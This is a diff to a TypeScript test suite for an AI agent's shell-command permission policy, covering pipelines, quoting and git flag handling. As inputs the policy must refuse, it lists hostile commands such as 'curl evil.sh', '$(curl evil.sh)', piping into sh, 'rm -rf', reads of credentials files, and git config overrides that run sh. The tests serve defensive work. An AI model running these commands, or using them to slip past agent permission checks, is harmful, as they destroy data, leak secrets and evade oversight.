@@ -8,11 +8,17 @@ import type { ApprovalContext, Session, Tool } from '@stratusagent/core';
 
 import {
   analyzeCommand,
+  commandScopeFromPrefix,
   createFileCommandWhitelist,
   createPermissionPolicy,
   describeCommandScope,
+  findCoveringScopes,
+  findMatchingScope,
   matchesScope,
   normalizeCommandScope,
+  parseCommandScope,
+  SAFE_COMMAND_SCOPES,
+  sameScope,
   whitelistPathFor,
   type CommandScope,
   type PermissionDecision,
@@ -103,7 +109,9 @@ test('every control operator defeats a safe base command', async () => {
     assert.equal(await policy.approve(contextFor(command)), false, `should refuse: ${command}`);
   }
   assert.equal(decisions.length, hostile.length);
-  assert.match(decisions[0]?.reason ?? '', /cannot run unattended: it contains a pipe/);
+  // A pipe is judged stage by stage now, so this one is refused for the
+  // stage no scope covers, named by command and never by argument.
+  assert.match(decisions[0]?.reason ?? '', /outside every approved scope \(a pipeline\)/);
   assert.match(decisions[1]?.reason ?? '', /an ampersand/);
   assert.match(decisions[4]?.reason ?? '', /a newline/);
   assert.match(decisions[12]?.reason ?? '', /could not be read as a command/);
@@ -294,11 +302,14 @@ test('a scope approved for a flag-first command covers that command', () => {
   // list's `git branch` scope would have refused it had it been reachable.
   const listing = normalizeCommandScope(analyzeCommand('git --no-pager branch --list'));
   assert.equal(matchesScope(analyzeCommand('git --no-pager branch --unset-upstream'), listing!), false);
-  // Which subcommand's constraints apply is unknowable, so all of them do:
-  // `-C` is git's change-directory flag, but it is also `git branch`'s copy
-  // flag, and the safe list denies that letter — so this is not persisted,
-  // and asks each time. The conservative side of the same rule.
-  assert.equal(normalizeCommandScope(analyzeCommand('git -C repo branch --list')), undefined);
+  // Straight after `git`, before any subcommand, `-C` can only be git's
+  // change-directory flag (`git branch -C` copies, but only after `branch`),
+  // so it is read as one: the repository joins the scope and the subcommand
+  // keeps its own constraints. Anywhere later, the rule above applies.
+  const inRepo = normalizeCommandScope(analyzeCommand('git -C repo branch --list'));
+  assert.deepEqual(inRepo?.args, ['-C', 'repo', 'branch']);
+  assert.equal(matchesScope(analyzeCommand('git -C repo branch --unset-upstream'), inRepo!), false);
+  assert.equal(normalizeCommandScope(analyzeCommand('git --no-pager -C repo branch --list')), undefined);
   // And a subcommand's positive constraints reach past the prefix too:
   // `git branch release` never persists a branch creation (the safe scope
   // is list-only), so neither does the same command behind `--no-pager` —
@@ -520,4 +531,324 @@ test('a listing scope names the flags it allows, so a mutating one it never hear
   const scope = normalizeCommandScope(analyzeCommand('git branch --list'));
   assert.ok(scope?.allowedFlags?.includes('--list'));
   assert.equal(scope?.allowedFlags?.includes('--unset-upstream'), false);
+});
+
+test('a pipeline runs unattended when every stage would on its own', async () => {
+  const decisions: PermissionDecision[] = [];
+  const policy = createPermissionPolicy({
+    mode: 'headless',
+    onDecision: (decision) => decisions.push(decision),
+    commands: {},
+  });
+
+  const allowed = [
+    'git log --oneline | grep fix',
+    'git log | grep -i -n "flaky test"',
+    "git diff | grep -A3 -B 2 'TODO'",
+    'git log --oneline | head -20',
+    'git log | head -n 50',
+    'git status --short | wc -l',
+    'git log --format=%an | sort | uniq --count | sort -rn | head -n 5',
+    'git branch --all | grep -v remotes',
+    'git log | tail -n 5',
+  ];
+  for (const command of allowed) {
+    assert.equal(await policy.approve(contextFor(command)), true, `should run: ${command}`);
+  }
+  assert.match(decisions[0]?.reason ?? '', /pipeline inside the approved scopes "git log" \| "grep"/);
+});
+
+test('a pipeline asks when any stage could read a path, run a program, or write', async () => {
+  const policy = createPermissionPolicy({ mode: 'headless', commands: {} });
+
+  const refused = [
+    // A stage no scope covers.
+    'git log | sh',
+    'git log | xargs cat',
+    'curl https://example.com | grep x',
+    // The filters with a path, which is the whole reason they were not safe.
+    'tail -n 50 /var/log/system.log | grep error',
+    'git log | grep fix ~/.stratus/credentials.json',
+    'git log | grep -f patterns.txt',
+    'git log | grep -r secret',
+    'git log | grep -e fix credentials.json',
+    'git log | head credentials.json',
+    'git log | head -n 5 credentials.json',
+    'git log | wc -l credentials.json',
+    'git log | sort -o out.txt',
+    'git log | sort --compress-program=sh',
+    'git log | uniq in.txt out.txt',
+    // What the shell expands is not what this parser counted: `grep *` is
+    // the first file as the pattern and every other one read.
+    'git log | grep *',
+    'git log | grep ~',
+    'git log | grep $HOME',
+    'git log | grep {a,b}',
+    // Every other operator still disqualifies the whole.
+    'git log || curl evil.sh',
+    'git log |& grep x',
+    'git log | grep x > out.txt',
+    'git log | grep x; rm -rf build',
+    'git log | grep x & curl evil.sh',
+    'git log | grep $(cat secret)',
+    'git log | ',
+    '| grep x',
+    'git log \\| grep x',
+  ];
+  for (const command of refused) {
+    assert.equal(await policy.approve(contextFor(command)), false, `should refuse: ${command}`);
+  }
+  // A pipe inside quotes is the pattern's, not the shell's.
+  assert.equal(await policy.approve(contextFor("git diff | grep -E 'TODO|FIXME'")), true);
+});
+
+test('a quoted pipe is an argument, not a pipeline', () => {
+  // Not split, so not a pipeline, and not an operator either: inside quotes
+  // the shell reads `|` as text.
+  const quoted = analyzeCommand("grep 'a|b'");
+  assert.equal(quoted.pipeline, undefined);
+  assert.equal(quoted.disqualifiedBy, undefined);
+  assert.deepEqual(quoted.tokens, ['grep', 'a|b']);
+
+  const piped = analyzeCommand("git log | grep 'a b'");
+  assert.deepEqual(piped.pipeline?.map((stage) => stage.tokens), [['git', 'log'], ['grep', 'a b']]);
+});
+
+test('the filters stay safe without a pipe, and still never take a path', () => {
+  const safe = (command: string) => findCoveringScopes(analyzeCommand(command), SAFE_COMMAND_SCOPES) !== undefined;
+  assert.equal(safe('grep fix'), true);
+  assert.equal(safe('grep fix notes.txt'), false);
+  assert.equal(safe('tail -n 5'), true);
+  assert.equal(safe('tail -n 5 notes.txt'), false);
+  assert.equal(safe('tail -f'), false);
+  assert.equal(safe('tail -n'), false);
+  assert.equal(safe('head -5'), true);
+  // A digit is not a letter, so `-5` cannot sneak a flag into a scope that
+  // does not name numeric flags.
+  assert.equal(safe('git branch -5'), false);
+});
+
+test('a pipeline is approved once, never persisted as a scope', async () => {
+  const asked: string[] = [];
+  const policy = createPermissionPolicy({
+    mode: 'interactive',
+    ask: async (question) => {
+      asked.push(question);
+      return 'always';
+    },
+    commands: {},
+  });
+  assert.equal(normalizeCommandScope(analyzeCommand('cat notes.txt | grep fix')), undefined);
+  assert.equal(await policy.approve(contextFor('cat notes.txt | grep fix')), true);
+  assert.equal(await policy.approve(contextFor('cat notes.txt | grep fix')), true);
+  assert.equal(asked.length, 2);
+});
+
+test('a whitelisted scope composes into a pipeline', async () => {
+  const policy = createPermissionPolicy({ mode: 'headless', commands: {} });
+  const granted = createPermissionPolicy({
+    mode: 'headless',
+    commands: { safeScopes: [...SAFE_COMMAND_SCOPES, { command: 'stratus', args: ['logs'] }] },
+  });
+  assert.equal(await policy.approve(contextFor('stratus logs --agent atlas | grep -i error')), false);
+  assert.equal(await granted.approve(contextFor('stratus logs --agent atlas | grep -i error')), true);
+  assert.equal(await granted.approve(contextFor('stratus logs --agent atlas | sh')), false);
+});
+
+test('the new scope fields survive a whitelist file and count in equality', () => {
+  const scope = parseCommandScope({ command: 'grep', maxPositionals: 1, flagsWithValue: ['-m'], literal: true });
+  assert.deepEqual(scope, { command: 'grep', maxPositionals: 1, flagsWithValue: ['-m'], literal: true });
+  assert.equal(parseCommandScope({ command: 'grep', maxPositionals: -1 })?.maxPositionals, undefined);
+  assert.equal(sameScope({ command: 'grep' }, { command: 'grep', maxPositionals: 1 }), false);
+  assert.equal(sameScope({ command: 'grep' }, { command: 'grep', literal: true }), false);
+});
+
+test('a command an operator declares is a prefix whose tail may vary, minus the destructive forms', () => {
+  const declared = (prefix: string): CommandScope => {
+    const result = commandScopeFromPrefix(prefix);
+    assert.ok('scope' in result, `${prefix} should be a scope`);
+    return result.scope;
+  };
+  const agentboard = declared('agentboard');
+  for (const command of ['agentboard task get 311', 'agentboard list --column todo', 'agentboard new "Fix it soon" --priority high']) {
+    assert.equal(matchesScope(analyzeCommand(command), agentboard), true, command);
+  }
+  assert.equal(matchesScope(analyzeCommand('agentboard task remove 311 --force'), agentboard), false);
+  assert.equal(matchesScope(analyzeCommand('agentboardx list'), agentboard), false);
+
+  const tests = declared('pnpm test');
+  assert.equal(matchesScope(analyzeCommand('pnpm test --filter @stratusagent/cli'), tests), true);
+  assert.equal(matchesScope(analyzeCommand('pnpm publish'), tests), false);
+  assert.equal(matchesScope(analyzeCommand('pnpm'), tests), false);
+
+  // git keeps the built-in list's refusals and its refspec rule.
+  const git = declared('git push');
+  assert.equal(matchesScope(analyzeCommand('git push origin nova/fix'), git), true);
+  assert.equal(matchesScope(analyzeCommand('git push origin :main'), git), false);
+  assert.equal(matchesScope(analyzeCommand('git push --force origin main'), git), false);
+  assert.equal(matchesScope(analyzeCommand('git -c core.sshCommand=sh push'), git), false);
+
+  // Refusals from an unrelated subcommand don't come along: `git remote`
+  // refuses `add`, which must not refuse `git add` itself.
+  const add = declared('git add');
+  assert.equal(matchesScope(analyzeCommand('git add -A'), add), true);
+  assert.equal(matchesScope(analyzeCommand('git add src/main.ts'), add), true);
+
+  // A built-in scope's limits come along, not just its refusals.
+  const branch = declared('git branch');
+  assert.equal(matchesScope(analyzeCommand('git branch --list'), branch), true);
+  assert.equal(matchesScope(analyzeCommand('git branch release'), branch), false);
+  assert.equal(matchesScope(analyzeCommand('git branch --unset-upstream'), branch), false);
+  const grep = declared('grep');
+  assert.equal(matchesScope(analyzeCommand('grep fix'), grep), true);
+  assert.equal(matchesScope(analyzeCommand('grep fix credentials.json'), grep), false);
+  // And a prefix longer than a limited built-in scope, whose limits it
+  // would otherwise shed.
+  for (const prefix of ['grep fix', 'git branch release']) {
+    assert.match((commandScopeFromPrefix(prefix) as { reason: string }).reason, /already limits/, prefix);
+  }
+  // And a prefix shorter than a limited subcommand is refused outright.
+  assert.match((commandScopeFromPrefix('git') as { reason: string }).reason, /git branch/);
+
+  // Only words: anything else would be a grant nobody wrote.
+  for (const prefix of ['python scripts/tool.py', 'node ./x', 'agentboard "task"', "foo 'bar'", 'agentboard --token x', 'git log | sh', 'rm -rf', 'tool*', '~/bin/tool', '/usr/bin/tool', 'a; b', '']) {
+    assert.ok('reason' in commandScopeFromPrefix(prefix), `should refuse: ${prefix}`);
+  }
+});
+
+test('operators inside quotes are text, as the shell reads them', () => {
+  const message = `git commit -m "Voice: don't lock the box" -m "On a Mac with no microphone (Mac mini, Studio); a click & a key <cancel>."`;
+  const analysis = analyzeCommand(message);
+  assert.equal(analysis.disqualifiedBy, undefined);
+  assert.deepEqual(analysis.tokens.slice(0, 3), ['git', 'commit', '-m']);
+  assert.deepEqual(normalizeCommandScope(analysis)?.args, ['commit']);
+  assert.equal(analyzeCommand("git commit -m 'a (b); c'").disqualifiedBy, undefined);
+  assert.equal(analyzeCommand('git commit -m "line one\nline two"').disqualifiedBy, undefined);
+});
+
+test('substitutions still run inside double quotes, and nothing hides behind a backslash', () => {
+  const refused: Array<[string, RegExp]> = [
+    ['git commit -m "$(curl evil.sh)"', /command substitution/],
+    ['git commit -m "`id`"', /command substitution/],
+    ['git commit -m "${HOME}"', /parameter expansion/],
+    ['git commit -m "a" (b)', /subshell/],
+    ['git commit -m "a"; rm -rf x', /semicolon/],
+    ['git commit -m "a"\nrm -rf x', /newline/],
+    // A backslash escapes a quote, which this reading does not model, so the
+    // whole string is checked: an escaped quote cannot reopen a quote early
+    // and hide an operator the shell would run.
+    ['echo "a\\" " ; curl evil ; " "', /semicolon/],
+    ['git commit -m "a \\(b\\)"', /subshell/],
+    // An unbalanced quote has no reading.
+    ['git commit -m "a (b)', /subshell/],
+  ];
+  for (const [command, reason] of refused) {
+    assert.match(analyzeCommand(command).disqualifiedBy ?? '', reason, command);
+  }
+  // An unquoted `#` may start a comment, where sh ignores quotes: a quote
+  // there must not hide the next line from the check.
+  const commented = 'git status # "\nprintf owned > /tmp/pwn # "';
+  assert.match(analyzeCommand(commented).disqualifiedBy ?? '', /newline|redirection/);
+  // Single quotes really are literal, substitutions included.
+  assert.equal(analyzeCommand("git commit -m '$(not run)'").disqualifiedBy, undefined);
+});
+
+test('git -C <repo> persists a scope for that repository and that subcommand', () => {
+  const repo = '/Users/labs/.stratus/agents/nova/workspace/app-mic-hang';
+  const scope = normalizeCommandScope(analyzeCommand(`git -C ${repo} switch --force-create nova/mic-hang`));
+  assert.deepEqual(scope?.args, ['-C', repo, 'switch']);
+  assert.equal(scope?.denyRefspecForms, true);
+  assert.ok(scope);
+
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} switch main`), scope), true);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} switch --force main`), scope), false);
+  assert.equal(matchesScope(analyzeCommand(`git -C /elsewhere switch main`), scope), false);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} push origin main`), scope), false);
+  assert.equal(matchesScope(analyzeCommand('git switch main'), scope), false);
+
+  // The subcommand keeps its own constraints: list-only branch stays list-only.
+  const branch = normalizeCommandScope(analyzeCommand(`git -C ${repo} branch`));
+  assert.deepEqual(branch?.args, ['-C', repo, 'branch']);
+  assert.ok(branch);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} branch release`), branch), false);
+  // And each scope covers the command it was approved for: the subcommand's
+  // refusal of `-C` (branch's copy flag) is not applied to git's own -C.
+  for (const command of [`git -C ${repo} branch`, `git -C ${repo} branch --list`, `git -C ${repo} switch --create nova/x`, `git -C ${repo} add -A`]) {
+    const analysis = analyzeCommand(command);
+    assert.equal(matchesScope(analysis, normalizeCommandScope(analysis)!), true, command);
+  }
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} branch -C a b`), branch), false);
+  // The repository operand is a path, whatever it is called.
+  for (const command of ['git -C add remote', 'git -C +repo status', 'git -C :repo log']) {
+    const analysis = analyzeCommand(command);
+    const scope = normalizeCommandScope(analysis);
+    assert.ok(scope, command);
+    assert.equal(matchesScope(analysis, scope), true, command);
+  }
+  assert.equal(matchesScope(analyzeCommand('git -C add remote add origin x'), normalizeCommandScope(analyzeCommand('git -C add remote'))!), false);
+
+  // The subcommand's scope is what it would be without -C: `push`, with
+  // --force still excluded however it was first approved.
+  const push = normalizeCommandScope(analyzeCommand(`git -C ${repo} push --force origin main`));
+  assert.deepEqual(push, { ...normalizeCommandScope(analyzeCommand('git push --force origin main')), args: ['-C', repo, 'push'] });
+  assert.ok(push);
+  assert.equal(matchesScope(analyzeCommand(`git -C ${repo} push --force origin main`), push), false);
+
+  // Nothing to store when the subcommand would not be storable without -C,
+  // or the repository is something the shell expands.
+  assert.equal(normalizeCommandScope(analyzeCommand(`git -C ${repo} -c core.pager=sh log`)), undefined);
+  assert.equal(normalizeCommandScope(analyzeCommand('git -C ~/repo status')), undefined);
+  assert.equal(normalizeCommandScope(analyzeCommand('git -C $REPO status')), undefined);
+  // Nor when the subcommand is spelled so the shell passes something else:
+  // `\\branch` is `branch` to sh, and must not escape its list-only rule.
+  for (const command of [`git -C ${repo} \\branch --list`, 'git \\branch --list', 'git $CMD x', 'git br* --list']) {
+    assert.equal(normalizeCommandScope(analyzeCommand(command)), undefined, command);
+  }
+
+  // -C does not make a command safe by itself: another repository on the
+  // host is reach the built-in list never promised.
+  assert.equal(findMatchingScope(analyzeCommand(`git -C ${repo} status`), SAFE_COMMAND_SCOPES), undefined);
+});
+
+test('git switch -c is a subcommand flag, not git -c', () => {
+  const analysis = analyzeCommand('git switch -c nova/fix');
+  const scope = normalizeCommandScope(analysis);
+  assert.ok(scope);
+  assert.equal(matchesScope(analysis, scope), true, 'the approved command is covered');
+  assert.equal(matchesScope(analyzeCommand('git switch -c nova/other'), scope), true);
+  // Still refused before the subcommand, and in a flag-first exact scope.
+  assert.equal(matchesScope(analyzeCommand('git -c core.hooksPath=/tmp switch main'), scope), false);
+  assert.equal(normalizeCommandScope(analyzeCommand('git -c core.pager=sh log')), undefined);
+  // With git's own -C in front, too.
+  const inRepo = analyzeCommand('git -C /work/app switch -c nova/fix');
+  const repoScope = normalizeCommandScope(inRepo);
+  assert.ok(repoScope);
+  assert.equal(matchesScope(inRepo, repoScope), true);
+  // Not for clone, whose -c sets config like git -c.
+  const clone = analyzeCommand('git clone https://example.com/x.git');
+  const cloneScope = normalizeCommandScope(clone);
+  assert.ok(cloneScope);
+  assert.equal(matchesScope(analyzeCommand('git clone -c core.sshCommand=/tmp/evil ssh://host/repo'), cloneScope), false);
+  // An attached value is the branch, not more flags.
+  assert.equal(matchesScope(analyzeCommand('git switch -cfix'), scope), true);
+  assert.equal(matchesScope(analyzeCommand('git commit -cHEAD'), normalizeCommandScope(analyzeCommand('git commit -m x'))!), true);
+  // Behind other short flags in one bundle, too, and those flags still count.
+  assert.equal(matchesScope(analyzeCommand('git switch -qcfix'), scope), true);
+  assert.equal(matchesScope(analyzeCommand('git commit -qvcHEAD'), normalizeCommandScope(analyzeCommand('git commit -m x'))!), true);
+  assert.equal(matchesScope(analyzeCommand('git switch -fcx'), scope), false, 'f is still destructive');
+  // A scope that denies -c itself still does.
+  assert.equal(matchesScope(analyzeCommand('git switch -c x'), { command: 'git', args: ['switch'], deniedFlags: ['-c'] }), false);
+  assert.equal(matchesScope(analyzeCommand('git switch -cx'), { command: 'git', args: ['switch'], deniedFlags: ['-c'] }), false);
+  // After `--` it's a path, judged as one.
+  assert.equal(matchesScope(analyzeCommand('git commit -- -cfoo'), { command: 'git', args: ['commit'], maxPositionals: 0 }), false);
+  assert.equal(matchesScope(analyzeCommand('git commit -- -cHEAD'), { command: 'git', args: ['commit', '--'], maxPositionals: 0, deniedFlags: ['D'] }), false);
+  // In a scope's own prefix, and behind more than one -C.
+  assert.equal(matchesScope(analyzeCommand('git switch -c topic'), { command: 'git', args: ['switch', '-c'] }), true);
+  const twice = analyzeCommand('git -C /repo -C subdir switch -cfix');
+  assert.equal(matchesScope(twice, normalizeCommandScope(twice)!), true);
+  // Nor when the scope names its flags and -c isn't one.
+  assert.equal(matchesScope(analyzeCommand('git switch -cfoo'), { command: 'git', args: ['switch'], allowedFlags: [] }), false);
+  assert.equal(matchesScope(analyzeCommand('git switch -c foo'), { command: 'git', args: ['switch'], allowedFlags: [] }), false);
+  // And for anything that is not git.
+  assert.equal(matchesScope(analyzeCommand('sh -c id'), { command: 'sh' }), false);
 });
